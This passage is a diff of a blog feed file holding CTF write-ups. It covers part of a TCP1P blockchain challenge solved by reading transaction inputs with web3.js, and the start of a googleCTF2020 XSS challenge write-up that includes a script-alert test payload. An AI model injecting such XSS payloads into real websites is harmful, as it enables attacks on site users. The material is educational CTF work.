+  &lt;span class=&quot;nx&quot;&gt;parentHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0xa69b4c1826293f2c8e291feab0c65c8a86cc6945fb595e8b0ad9f5460c354582&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;sha3Uncles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;miner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0x0000000000000000000000000000000000000000&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;stateRoot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0xd65448f21a330d2454d7e3ee63a370f55dbe74c582d7a5a0a89d1bb18656a367&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;transactionsRoot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0x4e89445408d7569031b3f1cf080d67e3ef00559509c274e4a792b5ded7c7c4b1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;receiptsRoot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0xfb3db4be5cb9ad4a0c55651a1adcd83c43ce7a226c2f4394a417526a3ea01ef2&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;logsBloom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0x00.....&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;gasLimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30000000&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;gasUsed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;376770&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1728849080&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;totalDifficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;extraData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0x&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;mixHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0x0000000000000000000000000000000000000000000000000000000000000000&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;baseFeePerGas&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;blobGasUsed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;excessBlobGas&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;uncles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;transactions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+    &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0x493554a088aac4c1a7f6aa11971df07cf213d40163f4bb5788653c21da59f443&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2275&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we have only one transaction mined good let’s take a further look&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0x493554a088aac4c1a7f6aa11971df07cf213d40163f4bb5788653c21da59f443&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;interesting enough we see what looks like a contract deployment&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/minercraft-contract-deploy.png&quot; alt=&quot;Contract Deployment&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Interesting…&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I felt adventurous so why not decompile it&lt;/p&gt;
+
+&lt;p&gt;for the decompilation I used a mixture of decompilers, manual guesses and ofcourse chatgpt
+and I ended up with this result.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;pragma solidity ^0.8.28;
+
+contract Setup {
+    ChallengeContract public ChallengeContract;
+
+    constructor() {
+        // Deploy the secondary contract with 1 ether
+        ChallengeContract = new ChallengeContract{value: 1 ether}();
+    }
+
+    function isSolved() external pure returns (uint256) {
+        return 0;
+    }
+}
+
+contract ChallengeContract {
+    string private storedString;
+
+    constructor() payable {
+        storedString = &quot;thisIsTheFirstOneIsntIt&quot;;
+    }
+
+    function setString(string memory newString) external {
+        storedString = newString;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Quite simple functionality but like what’s the challenge here ?
+At this stage I just ran through the blocks for further investigation maybe there are more contracts right ?&lt;/p&gt;
+
+&lt;p&gt;The second transaction was this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/minercraft-contract-2nd.png&quot; alt=&quot;Second transaction&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;it looks like a function call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setString&lt;/code&gt;, after further investigation it looked like all of the remaining blocks had the same call to setString but with different parameters.
+So the solution is obvious at this point, one of those &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setString&lt;/code&gt; calls has the flag.&lt;/p&gt;
+
+&lt;p&gt;I made this script to speed things up with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web3.js&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Web3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;rpc&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solve&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;async &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;//skip the contract deployment block&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;txHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transactions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//there&apos;s only one transaction in each block&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getTransaction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;txHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we got the output&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; TCP3P{this_is_one_p_not_three_p} //fake flag pretty lame 
+h I changed my mind again!
+Nah That does not sound good
+
+TCP1P.....
+,TCP1P{running_through_some_blocks_have_you?}
+That is lame, nevermind
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And that’s it for now, if you would like to reach out to me on discord and ask further question you can hit me up on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@pop_eax&lt;/code&gt;.&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">This weekend I participated in the TCP1P Capture the flag cybersecurity contest and together with my personal CTF team Xor and the half adder we managed to get placed at 15 out of 1110.</summary></entry><entry><title type="html">googleCTF2020 web challenges writeup</title><link href="http://localhost:4000/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/" rel="alternate" type="text/html" title="googleCTF2020 web challenges writeup" /><published>2020-08-23T15:28:00+02:00</published><updated>2020-08-23T15:28:00+02:00</updated><id>http://localhost:4000/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups</id><content type="html" xml:base="http://localhost:4000/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/">&lt;h1 id=&quot;pasteurize&quot;&gt;PASTEURIZE&lt;/h1&gt;
 
 &lt;p&gt;this was the easiest web challenge in the CTF&lt;/p&gt;
 
@@ -16,7 +563,7 @@
 
 &lt;p&gt;from what I have now, I can see that XSS is what I am supposed to look for
 &lt;br /&gt;when testing for xss I always throw this payload to see how the sanitaization is being done&lt;/p&gt;
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;checking the source code verifies the input is getting sanitaizied&lt;/p&gt;
@@ -41,14 +588,14 @@ and the high number of solves to the challenge doesn’t make me feel like we ne
 
 &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;asdasd&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cb33322e-4b48-4d0f-a748-1e509be9645d&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note_el&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;note-content&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note_url_el&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;note-title&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;clean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DOMPurify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sanitize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note_el&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;note-content&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;note_url_el&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;note-title&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;clean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DOMPurify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sanitize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;note_el&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;note_url_el&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;note_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;note_url_el&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;note_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;what if we put a &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; in our input and get a DOM based XSS&lt;/p&gt;
